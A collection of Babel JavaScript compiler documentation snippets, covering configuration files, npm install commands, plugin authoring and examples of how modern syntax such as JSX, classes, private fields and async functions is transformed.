TITLE: Arrow Function Context Example in JavaScript
DESCRIPTION: Demonstrates the difference between arrow functions and regular methods regarding 'this' context binding in object methods.

LANGUAGE: javascript
CODE:
const user = {
  firstName: "Sebastian",
  lastName: "McKenzie",
  getFullName: () => {
    // whoops! `this` doesn't actually reference `user` here
    return this.firstName + " " + this.lastName;
  },
  // use the method shorthand in objects
  getFullName2() {
    return this.firstName + " " + this.lastName;
  },
};

----------------------------------------

TITLE: Basic Babel Config with Browserslist
DESCRIPTION: Basic preset-env configuration using useBuiltIns entry and corejs 3.22 with browserslist targeting >0.25% market share.

LANGUAGE: json
CODE:
{
  "presets": [
    [
      "@babel/preset-env",
      {
        "useBuiltIns": "entry",
        "corejs": "3.22"
      }
    ]
  ]
}

----------------------------------------

TITLE: Using Babel Core API in JavaScript
DESCRIPTION: Example of using the Babel Core API to transform code programmatically. This approach is useful when integrating Babel into JavaScript applications or build tools.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-arrow-functions"],
});

----------------------------------------

TITLE: Custom Babel Plugin Example
DESCRIPTION: Demonstrates a simple custom Babel plugin that reverses identifier names, showcasing Babel's extensibility.

LANGUAGE: javascript
CODE:
// A plugin is just a function
export default function({ types: t }) {
  return {
    visitor: {
      Identifier(path) {
        let name = path.node.name; // reverse the name: JavaScript -> tpircSavaJ
        path.node.name = [...name]
          .reverse()
          .join("");
      },
    },
  };
}

----------------------------------------

TITLE: Converting ES2015 Arrow Function to ES5 with Babel
DESCRIPTION: Demonstrates how Babel transforms a modern ES2015 arrow function into an equivalent ES5 function for backwards compatibility.

LANGUAGE: javascript
CODE:
// Babel Input: ES2015 arrow function
[1, 2, 3].map(n => n + 1);

// Babel Output: ES5 equivalent
[1, 2, 3].map(function(n) {
  return n + 1;
});

----------------------------------------

TITLE: Class Definition in JavaScript
DESCRIPTION: Shows ES2015 class syntax with inheritance, constructor, instance methods, static methods and super calls. Classes provide a cleaner syntax for prototype-based inheritance.

LANGUAGE: JavaScript
CODE:
class SkinnedMesh extends THREE.Mesh {
  constructor(geometry, materials) {
    super(geometry, materials);

    this.idMatrix = SkinnedMesh.defaultMatrix();
    this.bones = [];
    this.boneMatrices = [];
    //...
  }
  update(camera) {
    //...
    super.update();
  }
  static defaultMatrix() {
    return new THREE.Matrix4();
  }
}

----------------------------------------

TITLE: Installing Babel CLI and Core with npm
DESCRIPTION: This command installs Babel CLI and Core as dev dependencies in your project. It's recommended to run this command in your project directory where package.json is located.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/core @babel/cli

----------------------------------------

TITLE: React Component with JSX and Hooks
DESCRIPTION: Illustrates a React functional component using JSX syntax and the useState hook, which Babel can transform.

LANGUAGE: jsx
CODE:
export default function DiceRoll(){
  const getRandomNumber = () => {
    return Math.ceil(Math.random() * 6);
  };

  const [num, setNum] = useState(getRandomNumber());

  const handleClick = () => {
    const newNum = getRandomNumber();
    setNum(newNum);
  };

  return (
    <div>
      Your dice roll: {num}.
      <button onClick={handleClick}>Click to get a new number</button>
    </div>
  );
};

----------------------------------------

TITLE: Transforming JSX to JavaScript with React Automatic Runtime
DESCRIPTION: This example demonstrates how JSX is transformed into JavaScript using the React Automatic Runtime. It shows the input JSX and the resulting JavaScript output, which includes automatic imports of JSX runtime functions.

LANGUAGE: JavaScript
CODE:
const profile = (
  <div>
    <img src="avatar.png" className="profile" />
    <h3>{[user.firstName, user.lastName].join(" ")}</h3>
  </div>
);

LANGUAGE: JavaScript
CODE:
import { jsx as _jsx } from "react/jsx-runtime";
import { jsxs as _jsxs } from "react/jsx-runtime";

const profile = _jsxs("div", {
  children: [
    _jsx("img", {
      src: "avatar.png",
      className: "profile",
    }),
    _jsx("h3", {
      children: [user.firstName, user.lastName].join(" "),
    }),
  ],
});

----------------------------------------

TITLE: Transforming Code with Babel Core and Preset-env
DESCRIPTION: Shows how to use @babel/core's transform method to compile code using the preset-env configuration. The transform method accepts source code as the first parameter and a configuration object as the second parameter.

LANGUAGE: javascript
CODE:
require("@babel/core").transform("code", {
  presets: ["@babel/preset-env"],
});

----------------------------------------

TITLE: Configuring babel.config.json to Use @babel/preset-env
DESCRIPTION: This JSON configuration enables the @babel/preset-env in the Babel configuration file. It should be placed in the project root directory.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-env"]
}

----------------------------------------

TITLE: Installing Babel Preset-env
DESCRIPTION: Command to install @babel/preset-env as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-env

----------------------------------------

TITLE: Installing Babel Core Package with npm or yarn
DESCRIPTION: This command installs the @babel/core package as a development dependency. @babel/core is the main package required for using Babel to transpile JavaScript code.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/core

----------------------------------------

TITLE: Example Class Properties Usage in JavaScript
DESCRIPTION: Demonstrates usage of class properties including instance properties, bound functions, and static properties with their behavior examples.

LANGUAGE: javascript
CODE:
class Bork {
  //Property initializer syntax
  instanceProperty = "bork";
  boundFunction = () => {
    return this.instanceProperty;
  };

  //Static class properties
  static staticProperty = "babelIsCool";
  static staticFunction = function() {
    return Bork.staticProperty;
  };
}

let myBork = new Bork();

//Property initializers are not on the prototype.
console.log(myBork.__proto__.boundFunction); // > undefined

//Bound functions are bound to the class instance.
console.log(myBork.boundFunction.call(undefined)); // > "bork"

//Static function exists on the class.
console.log(Bork.staticFunction()); // > "babelIsCool"

----------------------------------------

TITLE: Configuring Babel using babel.config.json
DESCRIPTION: Create a babel.config.json file at the root of your project to configure Babel. This format is recommended for monorepos or when compiling node_modules.

LANGUAGE: json
CODE:
{
  "presets": [...],
  "plugins": [...]
}

----------------------------------------

TITLE: Basic Preset Configuration in Babel
DESCRIPTION: Demonstrates how to configure basic presets in a Babel configuration file using npm packages and local paths.

LANGUAGE: json
CODE:
{
  "presets": ["babel-preset-myPreset", "@babel/preset-env"]
}

LANGUAGE: json
CODE:
{
  "presets": ["./myProject/myPreset"]
}

----------------------------------------

TITLE: Installing @babel/preset-env Using npm or yarn
DESCRIPTION: This command installs the @babel/preset-env package as a development dependency. This preset enables transforms for ES2015+ syntax.

LANGUAGE: shell
CODE:
npm install @babel/preset-env --save-dev

----------------------------------------

TITLE: Class Properties and Private Methods in JavaScript
DESCRIPTION: Demonstrates the usage of public fields, static properties, private fields, and private methods in a class, which are now supported by the shippedProposals option in @babel/preset-env.

LANGUAGE: JavaScript
CODE:
class Bork {
  // Public Fields
  instanceProperty = "bork";
  static staticProperty = "babelIsCool";
  // Private Fields
  #xValue = 0;
  a() {
    this.#xValue++;
  }

  // Private methods
  get #x() { return this.#xValue; }
  set #x(value) {
    this.#xValue = value;
  }
  #clicked() {
    this.#x++;
  }
}

----------------------------------------

TITLE: Implementing Class Static Blocks in JavaScript
DESCRIPTION: This snippet demonstrates the new class static blocks proposal, allowing additional static initializations when a class definition is evaluated. It shows how to initialize a static property using a private static field.

LANGUAGE: javascript
CODE:
class C {
  static #x = 42;
  static y;
  static {
    try {
      this.y = doSomethingWith(this.#x);
    } catch {
      this.y = "unknown";
    }
  }
}

----------------------------------------

TITLE: Installing Babel Flow Preset
DESCRIPTION: Demonstrates the command to install the Babel Flow preset for handling Flow type annotations.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-flow

----------------------------------------

TITLE: Configuring Babel for Class Static Blocks
DESCRIPTION: This JSON snippet shows how to configure Babel to use the class static blocks proposal plugin, ensuring it's placed before other class feature plugins.

LANGUAGE: json
CODE:
{
  "plugins": [
    "@babel/plugin-proposal-class-static-block",
    "@babel/plugin-proposal-class-properties"
  ]
}

----------------------------------------

TITLE: Implementing Arrow Functions in JavaScript
DESCRIPTION: Demonstrates arrow function syntax with expression bodies, statement bodies, lexical this binding and lexical arguments. Shows how arrow functions share the same lexical scope as their surrounding code.

LANGUAGE: JavaScript
CODE:
// Expression bodies
var odds = evens.map(v => v + 1);
var nums = evens.map((v, i) => v + i);

// Statement bodies
nums.forEach(v => {
  if (v % 5 === 0)
    fives.push(v);
});

// Lexical this
var bob = {
  _name: "Bob",
  _friends: [],
  printFriends() {
    this._friends.forEach(f =>
      console.log(this._name + " knows " + f));
  }
};

// Lexical arguments
function square() {
  let example = () => {
    let numbers = [];
    for (let number of arguments) {
      numbers.push(number * number);
    }

    return numbers;
  };

  return example();
}

square(2, 4, 7.5, 8, 11.5, 21); // returns: [4, 16, 56.25, 64, 132.25, 441]

----------------------------------------

TITLE: Installing Babel Core Dependencies
DESCRIPTION: Commands to install essential Babel packages including core, CLI, and preset-env

LANGUAGE: bash
CODE:
npm install --save-dev @babel/core @babel/cli @babel/preset-env

----------------------------------------

TITLE: Basic Babel Parser Usage
DESCRIPTION: Example of using @babel/parser to parse JavaScript code with JSX and Flow syntax enabled

LANGUAGE: JavaScript
CODE:
require("@babel/parser").parse("code", {
  // parse in strict mode and allow module declarations
  sourceType: "module",

  plugins: [
    // enable jsx and flow syntax
    "jsx",
    "flow",
  ],
});

----------------------------------------

TITLE: Updated package.json after Babel installation
DESCRIPTION: This snippet shows the changes made to the package.json file after installing Babel CLI and Core. It adds @babel/cli and @babel/core as devDependencies with their respective versions.

LANGUAGE: json
CODE:
{
  "devDependencies": {
+   "@babel/cli": "^7.0.0",
+   "@babel/core": "^7.0.0"
  }
}

----------------------------------------

TITLE: Destructuring Transform Example Input/Output
DESCRIPTION: Demonstrates how the plugin transforms ES6+ object and array destructuring syntax into ES5 compatible code, including rest parameters.

LANGUAGE: javascript
CODE:
let { x, y } = obj;

let [a, b, ...rest] = arr;

LANGUAGE: javascript
CODE:
function _toArray(arr) { ... }

let _obj = obj,
    x = _obj.x,
    y = _obj.y;

let _arr = arr,
    _arr2 = _toArray(_arr),
    a = _arr2[0],
    b = _arr2[1],
    rest = _arr2.slice(2);

----------------------------------------

TITLE: Polyfill Usage Example
DESCRIPTION: Demonstration of automatic polyfill injection when using useBuiltIns: 'usage' option.

LANGUAGE: javascript
CODE:
// a.js
var a = new Promise();

// b.js
var b = new Map();

LANGUAGE: javascript
CODE:
// a.js
import "core-js/modules/es.promise";
var a = new Promise();

// b.js
import "core-js/modules/es.map";
var b = new Map();

----------------------------------------

TITLE: Adding Babel Build Script to Package.json
DESCRIPTION: Shows how to add a build script to package.json that configures Babel to transform files from src directory to lib directory. The diff format indicates the lines to be added to the existing package.json file.

LANGUAGE: json
CODE:
  {
    "name": "my-project",
    "version": "1.0.0",
+   "scripts": {
+     "build": "babel src -d lib"
+   },
    "devDependencies": {
      "@babel/cli": "^7.0.0"
    }
  }

----------------------------------------

TITLE: Defining React Component Class in ES6+
DESCRIPTION: Shows how to define a React component using ES6 class syntax instead of React.createClass. The example creates a Photo component that renders an img element.

LANGUAGE: JavaScript
CODE:
class Photo extends React.Component {
  render() {
    return <img alt={this.props.caption} src={this.props.src} />;
  }
}

----------------------------------------

TITLE: Configuring Babel using .babelrc.json
DESCRIPTION: Create a .babelrc.json file in your project to configure Babel. This format is suitable for configurations that apply to a single part of your project.

LANGUAGE: json
CODE:
{
  "presets": [...],
  "plugins": [...]
}

----------------------------------------

TITLE: Importing polyfills in Babel 7
DESCRIPTION: Shows how to import polyfills directly from core-js in Babel 7, rather than using @babel/polyfill.

LANGUAGE: JavaScript
CODE:
// for core-js v2:
import "core-js/fn/array/flat-map";

// for core-js v3:
import "core-js/features/array/flat-map";

----------------------------------------

TITLE: Demonstrating Decorators and Class Auto Accessors in JavaScript
DESCRIPTION: This snippet showcases the new decorators syntax and class auto accessors feature supported in Babel 7.17.0. It includes decorating a class, a private method, and using the new reactive accessor.

LANGUAGE: JavaScript
CODE:
@defineElement("button")
class Button {
  @reactive accessor enabled = true; // class auto accessors

  @event("onClick") #handleClick() { // decorator on a private method
    console.log("clicked!");
  }
}

----------------------------------------

TITLE: Using Arrow Functions for Autobinding in React Components
DESCRIPTION: Shows how to use ES6 arrow functions and property initializers to achieve autobinding of methods to the component instance in React.

LANGUAGE: JavaScript
CODE:
class PostInfo extends React.Component {
  handleOptionsButtonClick = (e) => {
    this.setState({showOptionsModal: true});
  }
}

----------------------------------------

TITLE: Demonstrating Top-Level Await in JavaScript Modules
DESCRIPTION: Examples of using top-level await for dynamic imports and resource initialization in JavaScript modules.

LANGUAGE: javascript
CODE:
// Dynamic dependency path
const strings = await import(`./i18n/${navigator.language}.mjs`);

// Resource initialization
const connection = await dbConnector();

----------------------------------------

TITLE: Installing Babel CLI Dependencies
DESCRIPTION: Command to install Babel CLI and core packages locally as dev dependencies

LANGUAGE: shell
CODE:
npm install --save-dev @babel/core @babel/cli

----------------------------------------

TITLE: Accessing Nested Properties with Optional Chaining in JavaScript
DESCRIPTION: Demonstrates how to safely access deeply nested object properties using the optional chaining operator. Shows both dot notation and bracket notation usage.

LANGUAGE: javascript
CODE:
const obj = {
  foo: {
    bar: {
      baz: 42,
    },
  },
};

const baz = obj?.foo?.bar?.baz; // 42

const safe = obj?.qux?.baz; // undefined

// Optional chaining and normal chaining can be intermixed
obj?.foo.bar?.baz;

// Example usage with bracket notation:
obj?.["foo"]?.bar?.baz; // 42

----------------------------------------

TITLE: Arrow Function Transform Example
DESCRIPTION: Demonstration of how Babel transforms an arrow function to ES5 compatible code

LANGUAGE: javascript
CODE:
const fn = () => 1;

// converted to

var fn = function fn() {
  return 1;
};

----------------------------------------

TITLE: Transforming Async Function to Generator in JavaScript
DESCRIPTION: Example showing how an async function is transformed into a generator function using the plugin's default behavior.

LANGUAGE: javascript
CODE:
async function foo() {
  await bar();
}

LANGUAGE: javascript
CODE:
var _asyncToGenerator = function (fn) {
  ...
};
var foo = _asyncToGenerator(function* () {
  yield bar();
});

----------------------------------------

TITLE: Installing Babel Core and Register Packages
DESCRIPTION: Command to install Babel core and register packages as development dependencies. The @babel/register package enables require hooks for on-the-fly compilation of files, while @babel/core contains the core functionality for transforming code.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/register @babel/core

----------------------------------------

TITLE: Updating Babel config for scoped packages
DESCRIPTION: Example of updating Babel config to use new scoped package names in Babel 7.

LANGUAGE: JavaScript
CODE:
module.exports = {
  presets: ["@babel/env"], // "@babel/preset-env"
  plugins: ["@babel/transform-arrow-functions"], // same as "@babel/plugin-transform-arrow-functions"
};

----------------------------------------

TITLE: Implementing Private Instance Accessors in JavaScript Classes
DESCRIPTION: Demonstrates the usage of private instance getters and setters in JavaScript classes using the # prefix. This feature requires the @babel/plugin-proposal-private-methods plugin.

LANGUAGE: javascript
CODE:
class Person {
  #firstname = "Babel";
  #lastname = "JS";

  get #name() {
    return this.#firstname + " " + this.#lastname;
  }

  sayHi() {
    alert(`Hi, ${this.#name}!`);
  }
}

----------------------------------------

TITLE: Core-js Entry Point Usage
DESCRIPTION: Example of core-js imports being transformed by preset-env based on environment needs.

LANGUAGE: javascript
CODE:
import "core-js";

LANGUAGE: javascript
CODE:
import "core-js/modules/es.string.pad-start";
import "core-js/modules/es.string.pad-end";

----------------------------------------

TITLE: Demonstrating Logical Assignment Operators in JavaScript
DESCRIPTION: Examples of the new logical assignment operators (??=, &&=, ||=) introduced in ECMAScript 2021 and now supported by Babel's preset-env.

LANGUAGE: JavaScript
CODE:
this.disabled ??= false;
this.disabled ?? (this.disabled = false);

clicked &&= !isDoubleClicked();
clicked = clicked && !isDoubleClicked();

hasDups ||= (prev === cur);
if (!hasDup) hasDups = (prev === cur);

----------------------------------------

TITLE: Developing a Simple Babel Plugin in JavaScript
DESCRIPTION: A basic example of a Babel plugin that reverses identifiers' names, demonstrating the structure of a plugin and use of the visitor pattern.

LANGUAGE: js
CODE:
export default function() {
  return {
    visitor: {
      Identifier(path) {
        const name = path.node.name;
        // reverse the name: JavaScript -> tpircSavaJ
        path.node.name = name
          .split("")
          .reverse()
          .join("");
      },
    },
  };
}

----------------------------------------

TITLE: Using Dynamic Property Names and Template Strings in React setState
DESCRIPTION: Demonstrates how to use ES6 dynamic property names and template strings to set state in a React component based on a dynamic key.

LANGUAGE: JavaScript
CODE:
class Form extends React.Component {
  onChange(inputName, e) {
    this.setState({
      [`${inputName}Value`]: e.target.value,
    });
  }
}

----------------------------------------

TITLE: Installing @babel/register using npm or yarn
DESCRIPTION: This command installs the @babel/register package, which enables on-the-fly transpilation of JavaScript files using Babel. It's commonly used in development environments to allow running ES6+ code without a separate build step.

LANGUAGE: shell
CODE:
npm install @babel/register

----------------------------------------

TITLE: Demonstrating Class Static Blocks in JavaScript
DESCRIPTION: Example of the new class static initialization blocks feature, which is now enabled by default in Babel 7.16.0. This syntax allows for static initialization code to be run when a class is defined.

LANGUAGE: JavaScript
CODE:
class MyClass {
  static {
    doSomeInitialization(MyClass);
    console.log("MyClass initialized!");
  }
}

----------------------------------------

TITLE: Configuring Babel with JSON
DESCRIPTION: Basic Babel configuration using babel.config.json to specify browser targets and preset options

LANGUAGE: json
CODE:
{
  "presets": [
    [
      "@babel/preset-env",
      {
        "targets": {
          "edge": "17",
          "firefox": "60",
          "chrome": "67",
          "safari": "11.1"
        },
        "useBuiltIns": "usage",
        "corejs": "3.6.5"
      }
    ]
  ]
}

----------------------------------------

TITLE: Configuring @babel/preset-react with options in babel.config.json (Babel 8)
DESCRIPTION: Advanced configuration for @babel/preset-react in babel.config.json file with runtime, importSource, and throwIfNamespace options for Babel 8.

LANGUAGE: json
CODE:
{
  "presets": [
    [
      "@babel/preset-react",
      {
        "runtime": "automatic",
        "importSource": "custom-jsx-library",
        "throwIfNamespace": false
      }
    ]
  ]
}

----------------------------------------

TITLE: Configuring @babel/preset-react without options in babel.config.json
DESCRIPTION: Basic configuration for @babel/preset-react in babel.config.json file without any additional options.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-react"]
}

----------------------------------------

TITLE: Example Private Methods Usage in JavaScript Class
DESCRIPTION: Demonstrates usage of private class methods and accessors in a Counter class extending HTMLElement. Shows private field declaration, getter/setter implementation, and private method definition.

LANGUAGE: javascript
CODE:
class Counter extends HTMLElement {
  #xValue = 0;

  get #x() {
    return this.#xValue;
  }
  set #x(value) {
    this.#xValue = value;
    window.requestAnimationFrame(this.#render.bind(this));
  }

  #clicked() {
    this.#x++;
  }
}

----------------------------------------

TITLE: Importing core-js Polyfill
DESCRIPTION: Demonstrates how to import core-js stable polyfills as a replacement for the deprecated @babel/polyfill package.

LANGUAGE: javascript
CODE:
import "core-js/stable";

----------------------------------------

TITLE: Arrow Functions Transform Example Input
DESCRIPTION: Example of ES6 arrow function syntax that will be transformed by the plugin, including simple arrows, array methods, and method context preservation.

LANGUAGE: javascript
CODE:
var a = () => {};
var a = b => b;

const double = [1, 2, 3].map(num => num * 2);
console.log(double); // [2,4,6]

var bob = {
  _name: "Bob",
  _friends: ["Sally", "Tom"],
  printFriends() {
    this._friends.forEach(f => console.log(this._name + " knows " + f));
  },
};
console.log(bob.printFriends());

----------------------------------------

TITLE: Configuring core-js 3 support in @babel/preset-env
DESCRIPTION: Example of enabling core-js 3 support in the @babel/preset-env configuration. This allows using the latest polyfills and features from core-js 3.

LANGUAGE: JavaScript
CODE:
presets: [
  ["@babel/preset-env", {
    useBuiltIns: "usage", // or "entry"
    corejs: 3,
  }]
]

----------------------------------------

TITLE: Using Babel CLI with plugins
DESCRIPTION: Example of using Babel CLI to transform a script with a specific plugin. This command-line approach is useful for quick transformations or in build scripts.

LANGUAGE: bash
CODE:
babel --plugins @babel/plugin-transform-arrow-functions script.js

----------------------------------------

TITLE: Configuring Gulp Task for Babel Transpilation in JavaScript
DESCRIPTION: This snippet sets up a default Gulp task to transpile JavaScript using Babel. It processes a single file 'src/app.js' using the '@babel/preset-env' preset and outputs the result to the 'dist' directory.

LANGUAGE: JavaScript
CODE:
var gulp = require("gulp");
var babel = require("gulp-babel");

gulp.task("default", function () {
  return gulp.src("src/app.js")
    .pipe(babel({
      presets: ["@babel/preset-env"]
    }))
    .pipe(gulp.dest("dist"));
});

----------------------------------------

TITLE: Implementing Class Fields and Private Methods in JavaScript
DESCRIPTION: Demonstrates the usage of static public class fields, private fields, and private getters in JavaScript classes, which are now enabled by default in Babel 7.14.0.

LANGUAGE: javascript
CODE:
class Check {
  static className = "Check"; // static public class field

  #value = 3; // # means private!

  get #double() { // private getter
    return this.#value * 2; // using a private field
  }
}

----------------------------------------

TITLE: Implementing Private Instance Methods in JavaScript with Babel 7.2.0
DESCRIPTION: Demonstrates the usage of private instance methods in a class using the new Babel 7.2.0 feature. The example shows a Person class with a private age property and a private method to increase the age.

LANGUAGE: JavaScript
CODE:
class Person {
  #age = 19;

  #increaseAge() {
    this.#age++;
  }

  birthday() {
    this.#increaseAge();
    alert("Happy Birthday!");
  }
}

----------------------------------------

TITLE: Setting Plugin/Preset Options
DESCRIPTION: Example showing different ways to configure plugins and presets with various options.

LANGUAGE: JavaScript
CODE:
plugins: [
  // EntryTarget
  '@babel/plugin-transform-classes',

  // [EntryTarget, EntryOptions]
  ['@babel/plugin-transform-arrow-functions', { spec: true }],

  // [EntryTarget, EntryOptions, string]
  ['@babel/plugin-transform-for-of', { loose: true }, "some-name"],

  // ConfigItem
  babel.createConfigItem(require("@babel/plugin-transform-spread")),
]

----------------------------------------

TITLE: Flow Type Annotations Example
DESCRIPTION: Shows a JavaScript function with Flow type annotations that Babel can strip out during compilation.

LANGUAGE: javascript
CODE:
// @flow
function square(n: number): number {
  return n * n;
}

----------------------------------------

TITLE: Transforming Private Property in Object with Babel (JavaScript)
DESCRIPTION: Example of how the plugin transforms private property 'in' checks in JavaScript classes. It shows the input code with a private field and 'in' operator, and the resulting output after transformation.

LANGUAGE: JavaScript
CODE:
class Foo {
  #bar = "bar";

  test(obj) {
    return #bar in obj;
  }
}

LANGUAGE: JavaScript
CODE:
class Foo {
  constructor() {
    _bar.set(this, {
      writable: true,
      value: "bar",
    });
  }

  test() {
    return _bar.has(this);
  }
}

var _bar = new WeakMap();

----------------------------------------

TITLE: Configuring Babel Plugins in JSON
DESCRIPTION: Demonstrates how to specify plugins in a Babel configuration file, including npm packages and local paths.

LANGUAGE: json
CODE:
{
  "plugins": ["babel-plugin-myPlugin", "@babel/plugin-transform-runtime"]
}

LANGUAGE: json
CODE:
{
  "plugins": ["./node_modules/asdf/plugin"]
}

----------------------------------------

TITLE: Configuring Plugin Order in Babel JSON
DESCRIPTION: Illustrates the importance of plugin ordering in Babel configuration, as the order affects the transformation process.

LANGUAGE: json
CODE:
{
  "plugins": ["transform-decorators-legacy", "transform-class-properties"]
}

----------------------------------------

TITLE: Initializing Babel Plugin using helper-plugin-utils
DESCRIPTION: Demonstrates how to create a basic Babel plugin using the declare function from @babel/helper-plugin-utils. The declare function provides consistent API access and error handling across different Babel versions.

LANGUAGE: javascript
CODE:
import { declare } from "@babel/helper-plugin-utils";

export default declare((api, options, dirname) => {
  return {};
});

----------------------------------------

TITLE: Customizing Classic Runtime with Preact
DESCRIPTION: This example shows how to customize the Classic Runtime to use Preact instead of React. It demonstrates the use of JSX comments to specify the custom pragma and import.

LANGUAGE: JavaScript
CODE:
/** @jsx Preact.h */

import Preact from "preact";

const profile = (
  <div>
    <img src="avatar.png" className="profile" />
    <h3>{[user.firstName, user.lastName].join(" ")}</h3>
  </div>
);

LANGUAGE: JavaScript
CODE:
/** @jsx Preact.h */

import Preact from "preact";

const profile = Preact.h(
  "div",
  null,
  Preact.h("img", { src: "avatar.png", className: "profile" }),
  Preact.h("h3", null, [user.firstName, user.lastName].join(" "))
);

----------------------------------------

TITLE: Basic Babel Core Usage
DESCRIPTION: Example of using Babel core directly in JavaScript code

LANGUAGE: javascript
CODE:
const babel = require("@babel/core");

babel.transformSync("code", optionsObject);

----------------------------------------

TITLE: Updating Babel configuration to use babel-preset-env
DESCRIPTION: JSON diff showing how to replace babel-preset-es2015 with babel-preset-env in Babel configuration.

LANGUAGE: json
CODE:
{
+  "presets": ["env"]
-  "presets": ["es2015"]
}

----------------------------------------

TITLE: Node API Usage
DESCRIPTION: JavaScript code showing how to use the plugin via Node API

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-typescript"],
});

----------------------------------------

TITLE: Transforming ES2015 Parameters in JavaScript
DESCRIPTION: This snippet demonstrates how the plugin transforms ES2015 parameters (destructuring, default, and rest) to ES5 compatible code.

LANGUAGE: javascript
CODE:
function test(x = "hello", { a, b }, ...args) {
  console.log(x, a, b, args);
}

LANGUAGE: javascript
CODE:
function test() {
  var x =
    arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : "hello";
  var _ref = arguments[1];
  var a = _ref.a,
    b = _ref.b;

  for (
    var _len = arguments.length,
      args = Array(_len > 2 ? _len - 2 : 0),
      _key = 2;
    _key < _len;
    _key++
  ) {
    args[_key - 2] = arguments[_key];
  }

  console.log(x, a, b, args);
}

----------------------------------------

TITLE: Defining Browserslist Targets
DESCRIPTION: Example configuration showing how to specify browser targets using Browserslist syntax.

LANGUAGE: JSON
CODE:
{
  "targets": {
    "chrome": "58",
    "ie": "11"
  }
}

----------------------------------------

TITLE: Creating an ArrowFunctionExpression Node
DESCRIPTION: Example of creating an ArrowFunctionExpression node using the t.arrowFunctionExpression(params, body, async) builder function.

LANGUAGE: JavaScript
CODE:
t.arrowFunctionExpression(params, body, async);

----------------------------------------

TITLE: Running Babel Build Script via NPM
DESCRIPTION: Command to execute the Babel build script defined in package.json using NPM scripts. This will transform files from the src directory to the lib directory.

LANGUAGE: sh
CODE:
npm run build

----------------------------------------

TITLE: Transforming JSX Fragments with Automatic Runtime
DESCRIPTION: This example demonstrates how JSX Fragments are transformed using the React Automatic Runtime. It shows the input JSX with fragments and the resulting JavaScript output.

LANGUAGE: JavaScript
CODE:
const descriptions = items.map((item) => (
  <>
    <dt>{item.name}</dt>
    <dd>{item.value}</dd>
  </>
));

LANGUAGE: JavaScript
CODE:
import { jsxs as _jsxs } from "react/jsx-runtime";
import { Fragment as _Fragment } from "react/jsx-runtime";
import { jsx as _jsx } from "react/jsx-runtime";

const descriptions = items.map((item) =>
  _jsxs(_Fragment, {
    children: [
      _jsx("dt", {
        children: item.name,
      }),
      _jsx("dd", {
        children: item.value,
      }),
    ],
  })
);

----------------------------------------

TITLE: New JSX Transform Example
DESCRIPTION: Demonstrates the new JSX transform that uses runtime-specific functions instead of React.createElement, with automatic import handling.

LANGUAGE: jsx
CODE:
function Foo() {
  return <div />;
}

LANGUAGE: jsx
CODE:
import { jsx as _jsx } from "react/jsx-runtime";
function Foo() {
  return _jsx("div", ...);
}

----------------------------------------

TITLE: Class Mixin Pattern Example in JavaScript
DESCRIPTION: Demonstrates an unsupported mixin pattern when extending native classes and provides a workaround solution.

LANGUAGE: javascript
CODE:
class Foo extends mixin(Array) {}

function mixin(Super) {
  return class extends Super {
    mix() {}
  };
}

LANGUAGE: javascript
CODE:
const ExtensibleArray = class extends Array {};

class Foo extends mixin(ExtensibleArray) {}

----------------------------------------

TITLE: Basic Babel Configuration with Assumptions
DESCRIPTION: Example configuration showing how to specify compiler assumptions in babel.config.json to optimize compilation output.

LANGUAGE: json
CODE:
{
  "targets": ">0.5%",
  "assumptions": {
    "noDocumentAll": true,
    "noClassCalls": true
  },
  "presets": ["@babel/preset-env"]
}

----------------------------------------

TITLE: Babel Source Maps Configuration
DESCRIPTION: Commands showing how to generate source maps both as separate files and inline

LANGUAGE: shell
CODE:
npx babel script.js --out-file script-compiled.js --source-maps

LANGUAGE: shell
CODE:
npx babel script.js --out-file script-compiled.js --source-maps inline

----------------------------------------

TITLE: Babel CLI Usage with TypeScript
DESCRIPTION: Command line usage for transforming TypeScript files

LANGUAGE: shell
CODE:
babel --presets @babel/preset-typescript script.ts

----------------------------------------

TITLE: TypeScript Type-Only Import/Export Example
DESCRIPTION: Demonstrates the new TypeScript 3.8 feature for explicitly marking imports and exports as type-only using the type keyword.

LANGUAGE: typescript
CODE:
import type { SomeThing } from "./some-module.js";

export type { SomeThing };

----------------------------------------

TITLE: Enhanced Object Literals in JavaScript
DESCRIPTION: Demonstrates new object literal features including prototype setting, shorthand properties, method definitions, computed property names and super calls.

LANGUAGE: JavaScript
CODE:
var obj = {
    // Sets the prototype. "__proto__" or '__proto__' would also work.
    __proto__: theProtoObj,
    // Computed property name does not set prototype or trigger early error for
    // duplicate __proto__ properties.
    ['__proto__']: somethingElse,
    // Shorthand for 'handler: handler'
    handler,
    // Methods
    toString() {
     // Super calls
     return "d " + super.toString();
    },
    // Computed (dynamic) property names
    [ "prop_" + (() => 42)() ]: 42
};

----------------------------------------

TITLE: Configuring babel-preset-env with options
DESCRIPTION: JSON diff demonstrating how to update Babel configuration with preset options when switching to babel-preset-env.

LANGUAGE: json
CODE:
{
  "presets": [
+   ["env", {
-   ["es2015", {
      "modules": false
    }]
  ]
}

----------------------------------------

TITLE: Transforming Code with Babel Preset Env
DESCRIPTION: Example showing how to use @babel/preset-env with babel-standalone to transform code. The snippet demonstrates configuration of browser targets and built-ins usage.

LANGUAGE: javascript
CODE:
Babel.transform(code, {
  presets: [
    [
      "@babel/preset-env",
      {
        targets: {
          browsers: "last 1 safari version",
        },
        useBuiltIns: "usage",
      },
    ],
  ],
});

----------------------------------------

TITLE: Generator Function Transformation Example
DESCRIPTION: Shows how a simple generator function is transformed by the regenerator plugin into ES5 compatible code using regeneratorRuntime.

LANGUAGE: javascript
CODE:
function* a() {
  yield 1;
}

LANGUAGE: javascript
CODE:
var _marked = [a].map(regeneratorRuntime.mark);

function a() {
  return regeneratorRuntime.wrap(
    function a$(_context) {
      while (1) {
        switch ((_context.prev = _context.next)) {
          case 0:
            _context.next = 2;
            return 1;

          case 2:
          case "end":
            return _context.stop();
        }
      }
    },
    _marked[0],
    this
  );
}

----------------------------------------

TITLE: Creating Custom Babel Preset
